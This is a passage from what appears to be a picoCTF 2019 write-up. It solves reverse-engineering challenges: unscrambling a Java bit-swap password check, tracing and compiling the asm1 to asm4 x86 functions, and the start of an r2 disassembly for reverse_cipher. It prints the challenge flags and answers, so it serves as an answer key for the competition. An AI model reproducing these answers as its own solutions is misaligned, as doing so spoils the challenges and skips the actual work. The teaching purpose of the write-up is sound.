else {System.out.println(&quot;Access denied!&quot;); } } public char[] scramble(String password) {/* Scramble a password by transposing pairs of bits. */
char[] a = password.toCharArray(); for (int b=0; b&lt;a.length; b++) {char c = a[b]; c = switchBits(c,1,2); c = switchBits(c,0,3); /* c = switchBits(c,14,3); c = switchBits(c, 2, 0); */ c = switchBits(c,5,6); c = switchBits(c,4,7);
c = switchBits(c,0,1); /* d = switchBits(d, 4, 5); e = switchBits(e, 5, 6); */ c = switchBits(c,3,4); c = switchBits(c,2,5); c = switchBits(c,6,7); a[b] = c; } return a;
} public char switchBits(char c, int p1, int p2) {/* Move the bit in position p1 to position p2, and move the bit
that was in position p2 to position p1. Precondition: p1 &lt; p2 */ char mask1 = (char)(1 &lt;&lt; p1);
char mask2 = (char)(1 &lt;&lt; p2); /* char mask3 = (char)(1&lt;&lt;p1&lt;&lt;p2); mask1++; mask1--; */ char bit1 = (char)(c &amp; mask1); char bit2 = (char)(c &amp; mask2); /* System.out.println(&quot;bit1 &quot; + Integer.toBinaryString(bit1));
System.out.println(&quot;bit2 &quot; + Integer.toBinaryString(bit2)); */ char rest = (char)(c &amp; ~(mask1 | mask2)); char shift = (char)(p2 - p1); char result = (char)((bit1&lt;&lt;shift) | (bit2&gt;&gt;shift) | rest); return result;
} public boolean checkPassword(String password) {char[] scrambled = scramble(password); char[] expected = {
0xF4, 0xC0, 0x97, 0xF0, 0x77, 0x97, 0xC0, 0xE4, 0xF0, 0x77, 0xA4, 0xD0, 0xC5, 0x77, 0xF4, 0x86, 0xD0, 0xA5, 0x45, 0x96, 0x27, 0xB5, 0x77, 0xC1, 0xF1, 0xD0, 0x95, 0x94, 0xD1, 0xA5, 0xC2, 0xD0 }; return Arrays.equals(scrambled, expected); } }
</code></pre>
<p>This is a mess. I ran it through <a href="https://www.tutorialspoint.com/online_java_formatter.htm">A formatter</a>.</p>
<pre><code class="language-java">import java.util.*;
class Clean {
    public static void main(String args[]) {
        Scanner b = new Scanner(System.in);
        System.out.print(&quot;Enter vault password: &quot;);
        String c = b.next();
        String f = c.substring(8, c.length() - 1);
        VaultDoor8 a = new VaultDoor8();
        if (a.checkPassword(f)) {
            System.out.println(&quot;Access granted.&quot;);
        } else {
            System.out.println(&quot;Access denied!&quot;);
        }
    }
    /* Scramble a password by transposing pairs of bits. */
    public char[] scramble(String password) { 
        char[] a = password.toCharArray();
        for (int b = 0; b &lt; a.length; b++) {
            char c = a[b];
            c = switchBits(c, 1, 2);
            c = switchBits(c, 0, 3); /* c = switchBits(c,14,3); c = switchBits(c, 2, 0); */
            c = switchBits(c, 5, 6);
            c = switchBits(c, 4, 7);
            c = switchBits(c, 0, 1); /* d = switchBits(d, 4, 5); e = switchBits(e, 5, 6); */
            c = switchBits(c, 3, 4);
            c = switchBits(c, 2, 5);
            c = switchBits(c, 6, 7);
            a[b] = c;
        }
        return a;
    }
    public char switchBits(char c, int p1, int p2) {
        /* Move the bit in position p1 to position p2, and move the bit
        that was in position p2 to position p1. Precondition: p1 &lt; p2 */
        char mask1 = (char)(1 &lt;&lt; p1);
        char mask2 = (char)(1 &lt;&lt; p2); 
        char bit1 = (char)(c &amp; mask1);
        char bit2 = (char)(c &amp; mask2);
        char rest = (char)(c &amp; ~(mask1 | mask2));
        char shift = (char)(p2 - p1);
        char result = (char)((bit1 &lt;&lt; shift) | (bit2 &gt;&gt; shift) | rest);
        return result;
    }
    public boolean checkPassword(String password) {
        char[] scrambled = scramble(password);
        char[] expected = {
            0xF4,
            0xC0,
            0x97,
            0xF0,
            0x77,
            0x97,
            0xC0,
            0xE4,
            0xF0,
            0x77,
            0xA4,
            0xD0,
            0xC5,
            0x77,
            0xF4,
            0x86,
            0xD0,
            0xA5,
            0x45,
            0x96,
            0x27,
            0xB5,
            0x77,
            0xC1,
            0xF1,
            0xD0,
            0x95,
            0x94,
            0xD1,
            0xA5,
            0xC2,
            0xD0
        };
        return Arrays.equals(scrambled, expected);
    }
}
</code></pre>
<p>Some light manipulation plus reversing the swap order gives</p>
<pre><code class="language-java">import java.util.*;
class Sol {
    /* Scramble a password by transposing pairs of bits. */
    public static char[] unscramble(char[] in) { 
        char[] a = new char[in.length];
        for (int b = 0; b &lt; a.length; b++) {
            char c = in[b];
            c = switchBits(c, 6, 7);            
            c = switchBits(c, 2, 5);
            c = switchBits(c, 3, 4);
            c = switchBits(c, 0, 1); 
            c = switchBits(c, 4, 7);
            c = switchBits(c, 5, 6);
            c = switchBits(c, 0, 3); 
            c = switchBits(c, 1, 2);
            a[b] = c;
        }
        return a;
    }
    public static char switchBits(char c, int p1, int p2) {
        /* Move the bit in position p1 to position p2, and move the bit
        that was in position p2 to position p1. Precondition: p1 &lt; p2 */
        char mask1 = (char)(1 &lt;&lt; p1);
        char mask2 = (char)(1 &lt;&lt; p2); 
        char bit1 = (char)(c &amp; mask1);
        char bit2 = (char)(c &amp; mask2);
        char rest = (char)(c &amp; ~(mask1 | mask2));
        char shift = (char)(p2 - p1);
        char result = (char)((bit1 &lt;&lt; shift) | (bit2 &gt;&gt; shift) | rest);
        return result;
    }
    public static void main(String args[]){
        char[] expected = {
            0xF4, 0xC0, 0x97, 0xF0,
            0x77, 0x97, 0xC0, 0xE4, 
            0xF0, 0x77, 0xA4, 0xD0, 
            0xC5, 0x77, 0xF4, 0x86, 
            0xD0, 0xA5, 0x45, 0x96, 
            0x27, 0xB5, 0x77, 0xC1, 
            0xF1, 0xD0, 0x95, 0x94, 
            0xD1, 0xA5, 0xC2, 0xD0
        };
        char[] password = unscramble(expected);
        System.out.println(new String(password));
    }
}
</code></pre>
<p>Which gives us <code>s0m3_m0r3_b1t_sh1fTiNg_471ea5f81</code></p>
<p>Flag: <code>picoCTF{s0m3_m0r3_b1t_sh1fTiNg_471ea5f81}</code></p>
<h1><a class="header" href="#asm1" id="asm1">asm1</a></h1>
<p>We are given the following asm</p>
<pre><code class="language-x86asm">asm1:
	&lt;+0&gt;:	push   ebp
	&lt;+1&gt;:	mov    ebp,esp
	&lt;+3&gt;:	cmp    DWORD PTR [ebp+0x8],0x421
	&lt;+10&gt;:	jg     0x512 &lt;asm1+37&gt;
	&lt;+12&gt;:	cmp    DWORD PTR [ebp+0x8],0x1b4
	&lt;+19&gt;:	jne    0x50a &lt;asm1+29&gt;
	&lt;+21&gt;:	mov    eax,DWORD PTR [ebp+0x8]
	&lt;+24&gt;:	add    eax,0x13
	&lt;+27&gt;:	jmp    0x529 &lt;asm1+60&gt;
	&lt;+29&gt;:	mov    eax,DWORD PTR [ebp+0x8]
	&lt;+32&gt;:	sub    eax,0x13
	&lt;+35&gt;:	jmp    0x529 &lt;asm1+60&gt;
	&lt;+37&gt;:	cmp    DWORD PTR [ebp+0x8],0x7f7
	&lt;+44&gt;:	jne    0x523 &lt;asm1+54&gt;
	&lt;+46&gt;:	mov    eax,DWORD PTR [ebp+0x8]
	&lt;+49&gt;:	sub    eax,0x13
	&lt;+52&gt;:	jmp    0x529 &lt;asm1+60&gt;
	&lt;+54&gt;:	mov    eax,DWORD PTR [ebp+0x8]
	&lt;+57&gt;:	add    eax,0x13
	&lt;+60&gt;:	pop    ebp
	&lt;+61&gt;:	ret 
</code></pre>
<p>and asked &quot;What does asm1(0x1b4)&quot;</p>
<p>If we try to run it through gcc (<a href="https://explainshell.com/explain?cmd=+gcc+-m32+-c+test.S+-o+asm.o"><code>gcc -m32 -c test.S -o asm.o</code></a>) but this gives a bunch of errors due to the <code>&lt;+32&gt;</code> markers etc.</p>
<p><a href="https://github.com/noahc3/picoctf-2019-solutions/tree/master/Reverse%20Engineering/asm1">Someone very clever</a> figured out a way to run this, but that's not learning.</p>
<p>Instead we shall <a href="https://en.wikibooks.org/wiki/X86_Disassembly">learn assembly</a> as thats much more fun.</p>
<pre><code class="language-x86asm">	&lt;+0&gt;:	push   ebp
	&lt;+1&gt;:	mov    ebp,esp
</code></pre>
<p>This is the <a href="https://en.wikibooks.org/wiki/X86_Disassembly/Functions_and_Stack_Frames#Standard_Entry_Sequence">standard entry procedure</a></p>
<p>Next we have </p>
<pre><code class="language-x86asm">	&lt;+3&gt;:	cmp    DWORD PTR [ebp+0x8],0x421
</code></pre>
<p>Where are comparing (<code>cmp</code>) the literal value <code>0x421</code>. <code>DWORD PTR</code> means 32
bits, (don't ask), the <code>[...]</code> means get the value at the address of the inner,
and <code>ebp+0x8</code> is the first argument, as 4 bytes up is the return address, and 4
more bytes up is the first arguments, put their by the caller, as specified by
<a href="https://en.wikipedia.org/wiki/X86_calling_conventions#cdecl">calling
convensions</a></p>
<p>As we are told in the question, <code>DWORD PTR [ebp+0x8]</code> is <code>0x1b4</code>, which is less than <code>0x421</code>.</p>
<pre><code class="language-x86asm">	&lt;+10&gt;:	jg     0x512 &lt;asm1+37&gt;
</code></pre>
<p>This is a <a href="https://en.wikibooks.org/wiki/X86_Assembly/Control_Flow#Jump_if_Greater">jump if greater</a>. However because the result of the compare was less, we dont jump, but continue.</p>
<pre><code class="language-x86asm">	&lt;+12&gt;:	cmp    DWORD PTR [ebp+0x8],0x1b4
	&lt;+19&gt;:	jne    0x50a &lt;asm1+29&gt;
</code></pre>
<p>Again we compare the argument, <code>0x1b4</code>, this time to <code>0x1b4</code>. As they are equal, we dont jump at the 
<a href="https://en.wikibooks.org/wiki/X86_Assembly/Control_Flow#Jump_if_Not_Equal">jump if not equal</a>.</p>
<pre><code class="language-x86asm">	&lt;+21&gt;:	mov    eax,DWORD PTR [ebp+0x8]
	&lt;+24&gt;:	add    eax,0x13
</code></pre>
<p>This time we <code>mov</code>e <code>0x1b4</code> into <code>eax</code>, the register which is the return value.</p>
<p>Next we <code>add</code> <code>0x13</code> to <code>eax</code>. This makes <code>eax</code> <code>hex(0x1b4 + 0x13)</code>, which is <code>0x1c7</code></p>
<pre><code class="language-x86asm">	&lt;+27&gt;:	jmp    0x529 &lt;asm1+60&gt;
</code></pre>
<p>Here we <a href="https://en.wikibooks.org/wiki/X86_Assembly/Control_Flow#Unconditional_Jumps">unconditionaly jump</a> to <code>0x529</code>, which we are told is <code>&lt;asm1+60&gt;</code></p>
<pre><code class="language-x86asm">	&lt;+60&gt;:	pop    ebp
	&lt;+61&gt;:	ret 
</code></pre>
<p>This is the <a href="https://en.wikibooks.org/wiki/X86_Disassembly/Functions_and_Stack_Frames#Standard_Exit_Sequence">standard exit</a>, and by convension, <code>eax</code> is returned</p>
<p>Flag: <code>0x1c7</code></p>
<h1><a class="header" href="#asm2" id="asm2">asm2</a></h1>
<pre><code class="language-x86asm">asm2:
	&lt;+0&gt;:	push   ebp
	&lt;+1&gt;:	mov    ebp,esp
	&lt;+3&gt;:	sub    esp,0x10
	&lt;+6&gt;:	mov    eax,DWORD PTR [ebp+0xc]
	&lt;+9&gt;:	mov    DWORD PTR [ebp-0x4],eax
	&lt;+12&gt;:	mov    eax,DWORD PTR [ebp+0x8]
	&lt;+15&gt;:	mov    DWORD PTR [ebp-0x8],eax
	&lt;+18&gt;:	jmp    0x50c &lt;asm2+31&gt;
	&lt;+20&gt;:	add    DWORD PTR [ebp-0x4],0x1
	&lt;+24&gt;:	add    DWORD PTR [ebp-0x8],0xa9
	&lt;+31&gt;:	cmp    DWORD PTR [ebp-0x8],0x47a6
	&lt;+38&gt;:	jle    0x501 &lt;asm2+20&gt;
	&lt;+40&gt;:	mov    eax,DWORD PTR [ebp-0x4]
	&lt;+43&gt;:	leave  
	&lt;+44&gt;:	ret    
</code></pre>
<p>This time we are calling with <code>asm2(0x9,0x1e)</code></p>
<p>Arguments are put onto the stack right to left, so</p>
<ul>
<li><code>[ebp+0x8]</code> is arg 1, ie <code>0x9</code></li>
<li><code>[ebp+0xc]</code> is arg 2, ie <code>0x1e</code>.</li>
</ul>
<p>The first thing that happens, after the entry, is </p>
<pre><code class="language-x86asm">	&lt;+3&gt;:	sub    esp,0x10
</code></pre>
<p>This removes <code>0x10</code>, ie 16 bytes from the <code>esp</code>, esensialy creating 4 slots on the stack.</p>
<p>The stack now looks like this</p>
<table><thead><tr><th>address</th><th>value</th></tr></thead><tbody>
<tr><td><code>ebp + 0xc</code></td><td><code>0x1e</code></td></tr>
<tr><td><code>ebp + 0x8</code></td><td><code>0x9</code></td></tr>
<tr><td><code>ebp + 0x4</code></td><td>return address</td></tr>
<tr><td><code>ebp</code></td><td>old ebp</td></tr>
<tr><td><code>ebp - 0x4</code></td><td>local, unknown</td></tr>
<tr><td><code>ebp - 0x8</code></td><td>local, unknown</td></tr>
<tr><td><code>ebp - 0xc</code></td><td>local, unknown</td></tr>
<tr><td><code>ebp - 0x10</code></td><td>local, unknown</td></tr>
</tbody></table>
<p>Next we start filling the locals</p>
<pre><code class="language-x86asm">	&lt;+6&gt;:	mov    eax,DWORD PTR [ebp+0xc]
</code></pre>
<table><thead><tr><th>Address</th><th>Value</th><th>Regiseter</th><th>Value</th></tr></thead><tbody>
<tr><td><code>ebp + 0xc</code></td><td><code>0x1e</code></td><td><code>eax</code></td><td><code>0x1e</code></td></tr>
<tr><td><code>ebp + 0x8</code></td><td><code>0x9</code></td><td></td><td></td></tr>
<tr><td><code>ebp + 0x4</code></td><td>return address</td><td></td><td></td></tr>
<tr><td><code>ebp</code></td><td>old ebp</td><td></td><td></td></tr>
<tr><td><code>ebp - 0x4</code></td><td>local, unknown</td><td></td><td></td></tr>
<tr><td><code>ebp - 0x8</code></td><td>local, unknown</td><td></td><td></td></tr>
<tr><td><code>ebp - 0xc</code></td><td>local, unknown</td><td></td><td></td></tr>
<tr><td><code>ebp - 0x10</code></td><td>local, unknown</td><td></td><td></td></tr>
</tbody></table>
<pre><code class="language-x86asm">	&lt;+9&gt;:	mov    DWORD PTR [ebp-0x4],eax
</code></pre>
<table><thead><tr><th>Address</th><th>Value</th><th>Regiseter</th><th>Value</th></tr></thead><tbody>
<tr><td><code>ebp + 0xc</code></td><td><code>0x1e</code></td><td><code>eax</code></td><td><code>0x1e</code></td></tr>
<tr><td><code>ebp + 0x8</code></td><td><code>0x9</code></td><td></td><td></td></tr>
<tr><td><code>ebp + 0x4</code></td><td>return address</td><td></td><td></td></tr>
<tr><td><code>ebp</code></td><td>old ebp</td><td></td><td></td></tr>
<tr><td><code>ebp - 0x4</code></td><td><code>0x1e</code></td><td></td><td></td></tr>
<tr><td><code>ebp - 0x8</code></td><td>local, unknown</td><td></td><td></td></tr>
<tr><td><code>ebp - 0xc</code></td><td>local, unknown</td><td></td><td></td></tr>
<tr><td><code>ebp - 0x10</code></td><td>local, unknown</td><td></td><td></td></tr>
</tbody></table>
<pre><code class="language-x86asm">	&lt;+12&gt;:	mov    eax,DWORD PTR [ebp+0x8]
</code></pre>
<table><thead><tr><th>Address</th><th>Value</th><th>Regiseter</th><th>Value</th></tr></thead><tbody>
<tr><td><code>ebp + 0xc</code></td><td><code>0x1e</code></td><td><code>eax</code></td><td><code>0x9</code></td></tr>
<tr><td><code>ebp + 0x8</code></td><td><code>0x9</code></td><td></td><td></td></tr>
<tr><td><code>ebp + 0x4</code></td><td>return address</td><td></td><td></td></tr>
<tr><td><code>ebp</code></td><td>old ebp</td><td></td><td></td></tr>
<tr><td><code>ebp - 0x4</code></td><td><code>0x1e</code></td><td></td><td></td></tr>
<tr><td><code>ebp - 0x8</code></td><td>local, unknown</td><td></td><td></td></tr>
<tr><td><code>ebp - 0xc</code></td><td>local, unknown</td><td></td><td></td></tr>
<tr><td><code>ebp - 0x10</code></td><td>local, unknown</td><td></td><td></td></tr>
</tbody></table>
<pre><code class="language-x86asm">    &lt;+15&gt;:	mov    DWORD PTR [ebp-0x8],eax
</code></pre>
<table><thead><tr><th>Address</th><th>Value</th><th>Regiseter</th><th>Value</th></tr></thead><tbody>
<tr><td><code>ebp + 0xc</code></td><td><code>0x1e</code></td><td><code>eax</code></td><td><code>0x9</code></td></tr>
<tr><td><code>ebp + 0x8</code></td><td><code>0x9</code></td><td></td><td></td></tr>
<tr><td><code>ebp + 0x4</code></td><td>return address</td><td></td><td></td></tr>
<tr><td><code>ebp</code></td><td>old ebp</td><td></td><td></td></tr>
<tr><td><code>ebp - 0x4</code></td><td><code>0x1e</code></td><td></td><td></td></tr>
<tr><td><code>ebp - 0x8</code></td><td><code>0x9</code></td><td></td><td></td></tr>
<tr><td><code>ebp - 0xc</code></td><td>local, unknown</td><td></td><td></td></tr>
<tr><td><code>ebp - 0x10</code></td><td>local, unknown</td><td></td><td></td></tr>
</tbody></table>
<p>Then we enter this loop</p>
<pre><code class="language-x86asm">	&lt;+18&gt;:	jmp    0x50c &lt;asm2+31&gt;
	&lt;+20&gt;:	add    DWORD PTR [ebp-0x4],0x1
	&lt;+24&gt;:	add    DWORD PTR [ebp-0x8],0xa9
	&lt;+31&gt;:	cmp    DWORD PTR [ebp-0x8],0x47a6
	&lt;+38&gt;:	jle    0x501 &lt;asm2+20&gt;
</code></pre>
<p>Anotating the controll flow, we get</p>
<pre><code class="language-x86asm">	jmp    0x50c &lt;asm2+31&gt; →────────────┐ 
 ┌─→add    DWORD PTR [ebp-0x4],0x1      │
 │  add    DWORD PTR [ebp-0x8],0xa9     │
 │  cmp    DWORD PTR [ebp-0x8],0x47a6 ←─┘
 └─←jle    0x501 &lt;asm2+20&gt;
</code></pre>
<p>This is esensialy a while loop. While <code>[ebp-0x8]</code> is less than or equal to <code>0x47a6</code>, we run </p>
<pre><code class="language-x86asm">	&lt;+20&gt;:	add    DWORD PTR [ebp-0x4],0x1
	&lt;+24&gt;:	add    DWORD PTR [ebp-0x8],0xa9
</code></pre>
<p>Initialy ``[ebp-0x8]<code>is</code>0x9<code>. </code>(0x47a6 - 0x9) / 0xa9` is 108.4, so we will run 109 times.</p>
<p>This will increment <code>[ebp-0x4]</code>, 109 times, so it's final value will be <code>0x1e + 109*0x1</code> which is <code>0x8b</code></p>
<p>Finaly we</p>
<pre><code class="language-x86asm">	&lt;+40&gt;:	mov    eax,DWORD PTR [ebp-0x4]
	&lt;+43&gt;:	leave  
	&lt;+44&gt;:	ret   
</code></pre>
<p>This puts <code>[ebp-0x4]</code> in the return value, <a href="https://stackoverflow.com/a/29790275/11466826"><code>leave</code></a> clears up the stack, and then we return.</p>
<hr />
<p>Diagrams adapted from <a href="https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/asm2.md">Dvd848</a></p>
<h1><a class="header" href="#asm3" id="asm3">asm3</a></h1>
<p>This time the code is</p>
<pre><code class="language-x86asm">asm3:
	&lt;+0&gt;:	push   ebp
	&lt;+1&gt;:	mov    ebp,esp
	&lt;+3&gt;:	xor    eax,eax
	&lt;+5&gt;:	mov    ah,BYTE PTR [ebp+0xa]
	&lt;+8&gt;:	shl    ax,0x10
	&lt;+12&gt;:	sub    al,BYTE PTR [ebp+0xf]
	&lt;+15&gt;:	add    ah,BYTE PTR [ebp+0xe]
	&lt;+18&gt;:	xor    ax,WORD PTR [ebp+0x10]
	&lt;+22&gt;:	nop
	&lt;+23&gt;:	pop    ebp
	&lt;+24&gt;:	ret      
</code></pre>
<p>and we are calling <code>asm3(0xd46c9935,0xdfe28722,0xb335450f)</code></p>
<p>This code uses funky registers</p>
<p><img src="https://www.cs.virginia.edu/%7Eevans/cs216/guides/x86-registers.png" alt="" /></p>
<p>The code also gets acceess to the stack unaligned to the arguments</p>
<p>The CPU is oriented arount bytes, and every address is which byte to get. 
However most values are more than 8 bits, so we split the data across multiple bytes</p>
<pre><code>+--+--+--+--+--+--+--+--+--+--+--+--+
|A |A |A |A |B |B |B |B |C |C |C |C |
+--+--+--+--+--+--+--+--+--+--+--+--+
</code></pre>
<p>If we want to read <code>A</code>, we use the index of the start, and tell the CPU to read 32 bits,
(<code>DWORD</code>)</p>
<pre><code>+--+--+--+--+--+--+--+--+--+--+--+--+
|A |A |A |A |B |B |B |B |C |C |C |C |
+--+--+--+--+--+--+--+--+--+--+--+--+
|           |
+------------
      |
    Read
</code></pre>
<p>However their is no reason our reads need to be aligned to our variables. We can also</p>
<pre><code>+--+--+--+--+--+--+--+--+--+--+--+--+
|A |A |A |A |B |B |B |B |C |C |C |C |
+--+--+--+--+--+--+--+--+--+--+--+--+
      |           |
      +------------
            |
          Read
</code></pre>
<p>Here we get the last 2 bytes of <code>A</code> and the first 2 bytes of <code>B</code>.</p>
<p>With that out of the way, how does our stack look</p>
<pre><code>0xb335450f     &lt;- ebp - 0x10
0xdfe28722     &lt;- ebp - 0xc
0xd46c9935     &lt;- ebp - 0x8
Return Address &lt;- ebp - 0x4
Old EBP        &lt;- ebp 
</code></pre>
<p>This is all quite gnarly, and as their are no label's I just want to run it.</p>
<p>As this is 32 bits, we will need the a 32 bit libc, which you may need to
install <sup class="footnote-reference"><a href="#libc">1</a></sup></p>
<p>The modified asembly looks like this</p>
<pre><code class="language-x86asm">.intel_syntax noprefix
.global asm3

asm3:
	push   ebp
	mov    ebp,esp
	xor    eax,eax
	mov    ah,BYTE PTR [ebp+0xa]
	shl    ax,0x10
	sub    al,BYTE PTR [ebp+0xf]
	add    ah,BYTE PTR [ebp+0xe]
	xor    ax,WORD PTR [ebp+0x10]
	nop
	pop    ebp
	ret    
  
</code></pre>
<p>We remove the position labels <code>&lt;+...&gt;</code>, and add some directives (starts with a <code>.</code>),
to make gcc use intel syntax, and export the function.</p>
<p>Then we write a simple c wrapper to call it</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;

int asm3(int a, int b, int c);

void main() {
    int result = asm3(0xd46c9935,0xdfe28722,0xb335450f);
    printf(&quot;0x%x\n&quot;, result);
}
</code></pre>
<p>We declare the function at the top, call it, and print the result.</p>
<pre><code class="language-sh">gcc -m32 -c main.c -o main.o
gcc -m32 -c run.s -o asm.o
gcc -m32 main.o asm.o
</code></pre>
<p>Compiling we use <code>-m32</code> to enable 32 bit mode, and <code>-c</code> to disable the linker. In the final command, we run the linker to produce the executable <code>./a.out</code>.</p>
<p>Running it, we get <code>0xa72e</code></p>
<!-- TODO: debug with r2 and show what happens -->
<div class="footnote-definition" id="libc"><sup class="footnote-definition-label">1</sup>
<p><code>glibc-devel.i686</code> on fedora, <code>libc6-dev-i386</code> on debian based</p>
</div>
<h1><a class="header" href="#asm4" id="asm4">asm4</a></h1>
<pre><code class="language-x86asm">asm4:
	&lt;+0&gt;:	push   ebp
	&lt;+1&gt;:	mov    ebp,esp
	&lt;+3&gt;:	push   ebx
	&lt;+4&gt;:	sub    esp,0x10
	&lt;+7&gt;:	mov    DWORD PTR [ebp-0x10],0x244
	&lt;+14&gt;:	mov    DWORD PTR [ebp-0xc],0x0
	&lt;+21&gt;:	jmp    0x518 &lt;asm4+27&gt;
	&lt;+23&gt;:	add    DWORD PTR [ebp-0xc],0x1
	&lt;+27&gt;:	mov    edx,DWORD PTR [ebp-0xc]
	&lt;+30&gt;:	mov    eax,DWORD PTR [ebp+0x8]
	&lt;+33&gt;:	add    eax,edx
	&lt;+35&gt;:	movzx  eax,BYTE PTR [eax]
	&lt;+38&gt;:	test   al,al
	&lt;+40&gt;:	jne    0x514 &lt;asm4+23&gt;
	&lt;+42&gt;:	mov    DWORD PTR [ebp-0x8],0x1
	&lt;+49&gt;:	jmp    0x587 &lt;asm4+138&gt;
	&lt;+51&gt;:	mov    edx,DWORD PTR [ebp-0x8]
	&lt;+54&gt;:	mov    eax,DWORD PTR [ebp+0x8]
	&lt;+57&gt;:	add    eax,edx
	&lt;+59&gt;:	movzx  eax,BYTE PTR [eax]
	&lt;+62&gt;:	movsx  edx,al
	&lt;+65&gt;:	mov    eax,DWORD PTR [ebp-0x8]
	&lt;+68&gt;:	lea    ecx,[eax-0x1]
	&lt;+71&gt;:	mov    eax,DWORD PTR [ebp+0x8]
	&lt;+74&gt;:	add    eax,ecx
	&lt;+76&gt;:	movzx  eax,BYTE PTR [eax]
	&lt;+79&gt;:	movsx  eax,al
	&lt;+82&gt;:	sub    edx,eax
	&lt;+84&gt;:	mov    eax,edx
	&lt;+86&gt;:	mov    edx,eax
	&lt;+88&gt;:	mov    eax,DWORD PTR [ebp-0x10]
	&lt;+91&gt;:	lea    ebx,[edx+eax*1]
	&lt;+94&gt;:	mov    eax,DWORD PTR [ebp-0x8]
	&lt;+97&gt;:	lea    edx,[eax+0x1]
	&lt;+100&gt;:	mov    eax,DWORD PTR [ebp+0x8]
	&lt;+103&gt;:	add    eax,edx
	&lt;+105&gt;:	movzx  eax,BYTE PTR [eax]
	&lt;+108&gt;:	movsx  edx,al
	&lt;+111&gt;:	mov    ecx,DWORD PTR [ebp-0x8]
	&lt;+114&gt;:	mov    eax,DWORD PTR [ebp+0x8]
	&lt;+117&gt;:	add    eax,ecx
	&lt;+119&gt;:	movzx  eax,BYTE PTR [eax]
	&lt;+122&gt;:	movsx  eax,al
	&lt;+125&gt;:	sub    edx,eax
	&lt;+127&gt;:	mov    eax,edx
	&lt;+129&gt;:	add    eax,ebx
	&lt;+131&gt;:	mov    DWORD PTR [ebp-0x10],eax
	&lt;+134&gt;:	add    DWORD PTR [ebp-0x8],0x1
	&lt;+138&gt;:	mov    eax,DWORD PTR [ebp-0xc]
	&lt;+141&gt;:	sub    eax,0x1
	&lt;+144&gt;:	cmp    DWORD PTR [ebp-0x8],eax
	&lt;+147&gt;:	jl     0x530 &lt;asm4+51&gt;
	&lt;+149&gt;:	mov    eax,DWORD PTR [ebp-0x10]
	&lt;+152&gt;:	add    esp,0x10
	&lt;+155&gt;:	pop    ebx
	&lt;+156&gt;:	pop    ebp
	&lt;+157&gt;:	ret    
</code></pre>
<p>Yea, this is way to complex to trace, so we're going to run it.</p>
<p>We're told in the question the argument is a pointer. So are c is </p>
<pre><code class="language-c">#include &lt;stdio.h&gt;

int asm4(void*);

void main() {
    int res = asm4(&quot;picoCTF_d7243&quot;);
    printf(&quot;0x%x\n&quot;, res);
}
</code></pre>
<p>The asembly is </p>
<pre><code class="language-x86asm">.intel_syntax noprefix

.global asm4

asm4:
	push   ebp
	mov    ebp,esp
	push   ebx
	sub    esp,0x10
	mov    DWORD PTR [ebp-0x10],0x244
	mov    DWORD PTR [ebp-0xc],0x0
	jmp    of27
of23:
	add    DWORD PTR [ebp-0xc],0x1
of27:
	mov    edx,DWORD PTR [ebp-0xc]
	mov    eax,DWORD PTR [ebp+0x8]
	add    eax,edx
	movzx  eax,BYTE PTR [eax]
	test   al,al
	jne    of23
	mov    DWORD PTR [ebp-0x8],0x1
	jmp    of138
of51:
	mov    edx,DWORD PTR [ebp-0x8]
	mov    eax,DWORD PTR [ebp+0x8]
	add    eax,edx
	movzx  eax,BYTE PTR [eax]
	movsx  edx,al
	mov    eax,DWORD PTR [ebp-0x8]
	lea    ecx,[eax-0x1]
	mov    eax,DWORD PTR [ebp+0x8]
	add    eax,ecx
	movzx  eax,BYTE PTR [eax]
	movsx  eax,al
	sub    edx,eax
	mov    eax,edx
	mov    edx,eax
	mov    eax,DWORD PTR [ebp-0x10]
	lea    ebx,[edx+eax*1]
	mov    eax,DWORD PTR [ebp-0x8]
	lea    edx,[eax+0x1]
	mov    eax,DWORD PTR [ebp+0x8]
	add    eax,edx
	movzx  eax,BYTE PTR [eax]
	movsx  edx,al
	mov    ecx,DWORD PTR [ebp-0x8]
	mov    eax,DWORD PTR [ebp+0x8]
	add    eax,ecx
	movzx  eax,BYTE PTR [eax]
	movsx  eax,al
	sub    edx,eax
	mov    eax,edx
	add    eax,ebx
	mov    DWORD PTR [ebp-0x10],eax
	add    DWORD PTR [ebp-0x8],0x1
of138:
	mov    eax,DWORD PTR [ebp-0xc]
	sub    eax,0x1
	cmp    DWORD PTR [ebp-0x8],eax
	jl     of51
	mov    eax,DWORD PTR [ebp-0x10]
	add    esp,0x10
	pop    ebx
	pop    ebp
	ret    
</code></pre>
<p>We add labels where all the jumps are, and replace the hex literals with the lables.</p>
<p>Compile and run</p>
<pre><code class="language-sh">gcc -m32 -c run.s -o asm.o 
gcc -m32 -c main.c -o main.o
gcc -m32 asm.o main.o
</code></pre>
<p>And we get <code>0x1d2</code></p>
<p>Flag: <code>0x1d2</code></p>
<h1><a class="header" href="#reverse_cipher" id="reverse_cipher">reverse_cipher</a></h1>
<p>Acording to r2, the asm is </p>
<pre><code class="language-x86asm">            ; DATA XREF from entry0 @ 0x10bd
┌ 324: int main (int argc, char **argv, char **envp);
│           ; var void *ptr @ rbp-0x50
│           ; var int64_t var_39h @ rbp-0x39
│           ; var size_t var_24h @ rbp-0x24
│           ; var file*var_20h @ rbp-0x20
│           ; var file*stream @ rbp-0x18
│           ; var signed int64_t var_ch @ rbp-0xc
│           ; var signed int64_t var_8h @ rbp-0x8
│           ; var int64_t c @ rbp-0x1
│           0x00001185      55             push rbp
│           0x00001186      4889e5         mov rbp, rsp
│           0x00001189      4883ec50       sub rsp, 0x50
│           0x0000118d      488d35740e00.  lea rsi, [0x00002008]       ; &quot;r&quot; ; const char *mode
│           0x00001194      488d3d6f0e00.  lea rdi, str.flag.txt       ; 0x200a ; &quot;flag.txt&quot; ; const char *filename
│           0x0000119b      e8d0feffff     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)
│           0x000011a0      488945e8       mov qword [stream], rax
│           0x000011a4      488d35680e00.  lea rsi, [0x00002013]       ; &quot;a&quot; ; const char *mode
│           0x000011ab      488d3d630e00.  lea rdi, str.rev_this       ; 0x2015 ; &quot;rev_this&quot; ; const char *filename
│           0x000011b2      e8b9feffff     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)
│           0x000011b7      488945e0       mov qword [var_20h], rax
│           0x000011bb      48837de800     cmp qword [stream], 0
│       ┌─&lt; 0x000011c0      750c           jne 0x11ce
│       │   0x000011c2      488d3d570e00.  lea rdi, str.No_flag_found__please_make_sure_this_is_run_on_the_server ; 0x2020 ; &quot;No flag found, please make sure this is run on the server&quot; ; const char *s
